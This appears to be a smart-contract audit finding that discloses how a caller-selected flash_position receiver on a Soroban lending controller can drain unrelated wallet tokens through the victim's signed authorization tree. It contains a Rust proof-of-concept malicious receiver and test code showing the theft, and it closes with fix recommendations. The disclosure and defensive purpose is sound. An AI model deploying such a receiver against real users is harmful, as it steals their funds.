### Title
Caller-controlled flash-position receiver can execute unauthorized token transfers under the caller’s signed authorization tree - (File: contracts/controller/src/strategies/flash_position.rs)

### Summary

`flash_position` accepts an arbitrary `receiver` contract and attacker-controlled `data`, invokes `execute_flash_position` on that receiver, and only excludes the controller and pool as receivers. A malicious receiver can therefore invoke an unrelated token’s `transfer(initiator, attacker, amount)` during the callback; when the caller signs the simulated authorization tree containing that child call, the unrelated wallet tokens are transferred to the attacker. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) 

### Finding Description

`process_flash_position` requires caller authorization, but `receiver` is caller-selected and is validated only as a WASM contract different from the controller and pool. [5](#0-4) 

The controller passes the uninterpreted `data` bytes to `execute_flash_position`, giving the selected receiver an arbitrary execution context while the caller’s `flash_position` authorization remains active. [6](#0-5) [2](#0-1) 

Soroban records a nested `require_auth` for the caller as a child of the caller’s root authorization; the repository’s authorization test shows that route-selected code can invoke a token transfer from the root caller when the signed tree contains that child. [3](#0-2) [4](#0-3) 

The post-callback accounting only measures declared collateral and refund-asset balance deltas, then checks that the account remains open and solvent; it does not detect or bound unrelated transfers from the caller’s wallet. [7](#0-6) [8](#0-7) [9](#0-8) 

### Impact Explanation

A crafted transaction can steal any token balance that the victim can authorize by adding a token `transfer(victim, attacker, amount)` child invocation beneath the `flash_position` root. [10](#0-9) [11](#0-10) 

The attacker can preload or fund the receiver with enough collateral to satisfy the declared minimums and final risk checks, so the malicious side transfer commits atomically with an otherwise valid position. [7](#0-6) [12](#0-11) 

This is theft of user funds beyond the flash-position collateral and routed debt amounts. [13](#0-12) 

### Likelihood Explanation

An unprivileged attacker can deploy the receiver and distribute a crafted `flash_position` call or signing link containing that receiver and opaque `data`. [14](#0-13) [15](#0-14) 

The attack requires the victim to sign the authorization tree produced by simulation, so it is user-interaction dependent rather than directly exploitable without consent. [13](#0-12) 

Nevertheless, the extra transfer is represented only as an authorization child and is not described by the public `flash_position` arguments or constrained by the controller’s settlement checks. [7](#0-6) [11](#0-10) 

### Recommendation

Restrict `flash_position` receivers to a governance-approved receiver registry or remove caller-selected receiver callbacks from the position flow. [15](#0-14) [10](#0-9) 

Until receivers are restricted, clients and wallets should decode the complete signed authorization tree and reject any child invocation other than the explicit token movements required by the displayed operation. [11](#0-10) [13](#0-12) 

### Proof of Concept

1. The attacker deploys a receiver implementing `execute_flash_position` and stores `stolen_token`, `attacker`, `steal_amount`, `collateral_token`, and `collateral_amount` in its configuration. [2](#0-1) 

2. The receiver performs both the theft and the protocol-required collateral payment:

```rust
fn execute_flash_position(
    env: Env,
    initiator: Address,
    _account_id: u64,
    _asset: Address,
    _amount: i128,
    _fee: i128,
    _amount_received: i128,
    controller: Address,
    _data: Bytes,
) {
    let cfg = config(&env);

    token::Client::new(&env, &cfg.stolen_token).transfer(
        &initiator,
        &cfg.attacker,
        &cfg.steal_amount,
    );

    token::Client::new(&env, &cfg.collateral_token).transfer(
        &env.current_contract_address(),
        &controller,
        &cfg.collateral_amount,
    );
}
```

The first transfer consumes the `initiator` authorization recorded under the victim’s `flash_position` root, while the second transfer satisfies the callback’s collateral delivery. [16](#0-15) [8](#0-7) [3](#0-2) [4](#0-3) 

3. The attacker gives the victim a `flash_position` invocation naming the malicious receiver, declares `collateral_token` with a minimum no greater than `collateral_amount`, and selects debt parameters that leave the victim account solvent. [17](#0-16) [12](#0-11) 

4. Simulation records the malicious token transfer as a child authorization, and once the victim signs that tree the receiver moves `steal_amount` to the attacker before the controller finishes deposit and solvency checks. [18](#0-17) [7](#0-6)

### Citations

**File:** contracts/controller/src/strategies/flash_position.rs (L40-83)
```rust
pub(crate) fn process_flash_position(
    env: &Env,
    caller: &Address,
    params: FlashPositionParams<'_>,
) -> u64 {
    require_authorized_caller(env, caller);

    let FlashPositionParams {
        account_id,
        spoke_id,
        mode,
        debt,
        amount,
        receiver,
        data,
        collaterals,
        refund_assets,
    } = params;

    require_positive_amount(env, amount);
    config::require_hub_active(env, debt.hub_id);
    assert_with_error!(
        env,
        matches!(
            mode,
            PositionMode::Multiply | PositionMode::Long | PositionMode::Short
        ),
        CollateralError::InvalidPositionMode
    );
    require_wasm_receiver(env, receiver);

    let controller = env.current_contract_address();
    assert_with_error!(
        env,
        *receiver != controller,
        FlashLoanError::InvalidFlashloanReceiver
    );

    let mut cache = Context::new(env);
    let pool_addr = cache.cached_pool_address();
    assert_with_error!(
        env,
        *receiver != pool_addr,
        FlashLoanError::InvalidFlashloanReceiver
```

**File:** contracts/controller/src/strategies/flash_position.rs (L93-117)
```rust
    let (account_id, mut account) = account::load_or_create_account(
        env,
        caller,
        account_id,
        spoke_id,
        mode,
        account::AccountGuard::Multiply,
        &mut cache,
    );

    validate_collaterals(env, &mut cache, &account, collaterals);
    validate_refund_assets(
        env,
        &mut cache,
        account.spoke_id,
        debt.hub_id,
        collaterals,
        refund_assets,
    );

    let mut extra_assets = vec![env, debt.asset.clone()];
    for (hub_asset, _) in collaterals.iter() {
        extra_assets.push_back(hub_asset.asset.clone());
    }
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);
```

**File:** contracts/controller/src/strategies/flash_position.rs (L119-141)
```rust
    // Guard both forwarding and the callback: token hooks can reenter first.
    let (amount_received, collateral_before, refund_before) =
        storage::with_flash_guard(env, || {
            let amount_received =
                mint_and_forward(env, &mut account, debt, amount, receiver, &mut cache);
            // Baselines exclude funding and forwarding; count callback receipts only.
            let collateral_before = snapshot_balances(
                env,
                &controller,
                collaterals.iter().map(|(hub_asset, _)| hub_asset.asset),
            );
            let refund_before = snapshot_balances(env, &controller, refund_assets.iter());
            invoke_receiver(
                env,
                receiver,
                caller,
                account_id,
                &debt.asset,
                amount,
                amount_received,
                &controller,
                data,
            );
```

**File:** contracts/controller/src/strategies/flash_position.rs (L145-154)
```rust
    let deposits = collect_collateral_deposits(env, &controller, collaterals, &collateral_before);
    process_deposit(env, &controller, &mut account, &deposits, &mut cache);

    refund_listed_assets(env, caller, refund_assets, &refund_before);

    // Check before and after finalization: its LTV refresh can prune zero-scaled
    // supply, and persistence removes empty accounts.
    require_flash_position_still_open(env, &account, debt);
    strategy_finalize(env, account_id, &mut account, &mut cache);
    require_flash_position_still_open(env, &account, debt);
```

**File:** contracts/controller/src/strategies/flash_position.rs (L180-214)
```rust
    require_non_empty_payments(env, collaterals);

    let limits = storage::get_position_limits(env);
    assert_with_error!(
        env,
        collaterals.len() <= limits.max_supply_positions,
        GenericError::InvalidPayments
    );

    let mut seen_assets: Map<Address, bool> = Map::new(env);
    let mut has_positive_min = false;

    for (hub_asset, min_amount) in collaterals.iter() {
        require_nonneg_amount(env, min_amount);
        assert_with_error!(
            env,
            !seen_assets.contains_key(hub_asset.asset.clone()),
            GenericError::InvalidPayments
        );
        if min_amount > 0 {
            has_positive_min = true;
        }
        require_can_supply(env, cache, account.spoke_id, &hub_asset);
        seen_assets.set(hub_asset.asset.clone(), true);
    }

    assert_with_error!(env, has_positive_min, StrategyError::CollateralRequired);

    validate_position_entry_gates(
        env,
        account,
        collaterals,
        cache,
        AccountPositionType::Deposit,
    );
```

**File:** contracts/controller/src/strategies/flash_position.rs (L297-322)
```rust
fn invoke_receiver(
    env: &Env,
    receiver: &Address,
    initiator: &Address,
    account_id: u64,
    asset: &Address,
    amount: i128,
    amount_received: i128,
    controller: &Address,
    data: &Bytes,
) {
    env.invoke_contract::<()>(
        receiver,
        &Symbol::new(env, "execute_flash_position"),
        (
            initiator.clone(),
            account_id,
            asset.clone(),
            amount,
            0i128,
            amount_received,
            controller.clone(),
            data.clone(),
        )
            .into_val(env),
    );
```

**File:** contracts/controller/src/strategies/flash_position.rs (L325-351)
```rust
fn collect_collateral_deposits(
    env: &Env,
    controller: &Address,
    collaterals: &Vec<(HubAssetKey, i128)>,
    before: &Map<Address, i128>,
) -> Vec<(HubAssetKey, i128)> {
    let mut deposits: Vec<(HubAssetKey, i128)> = Vec::new(env);
    for (hub_asset, min_amount) in collaterals.iter() {
        let baseline = before
            .get(hub_asset.asset.clone())
            .unwrap_or_else(|| panic_with_error!(env, GenericError::InternalError));
        let delta = balance_delta_since(env, &hub_asset.asset, controller, baseline);
        assert_with_error!(
            env,
            delta >= min_amount,
            StrategyError::CollateralMinimumNotMet
        );
        if delta > 0 {
            deposits.push_back((hub_asset, delta));
        }
    }
    assert_with_error!(
        env,
        !deposits.is_empty(),
        StrategyError::CollateralMinimumNotMet
    );
    deposits
```

**File:** contracts/controller/src/strategies/flash_position.rs (L372-383)
```rust
fn refund_listed_assets(
    env: &Env,
    caller: &Address,
    refund_assets: &Vec<Address>,
    before: &Map<Address, i128>,
) {
    for asset in refund_assets.iter() {
        let baseline = before
            .get(asset.clone())
            .unwrap_or_else(|| panic_with_error!(env, GenericError::InternalError));
        refund_controller_balance_delta(env, &asset, baseline, caller);
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-268)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L271-280)
```rust
/// Controller stand-in: root-frame `caller.require_auth()`, then route-selected code.
#[contract]
pub struct RootAuthEntry;

#[contractimpl]
impl RootAuthEntry {
    pub fn run(env: Env, caller: Address, hop_pool: Address) {
        caller.require_auth();
        let _: Val = env.invoke_contract(&hop_pool, &symbol_short!("swap"), vec![&env]);
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L363-367)
```rust
    let transfer_args: Vec<Val> = (wallet.clone(), attacker.clone(), 99i128).into_val(&env);
    let child = contract_fn(&env, &wallet_token, "transfer", transfer_args, std::vec![]);
    env.set_auths(&[as_source_account(std::vec![child])]);
    client.run(&wallet, &rogue_pool);
    assert_eq!(token.moved(), Some((attacker, 99)));
```
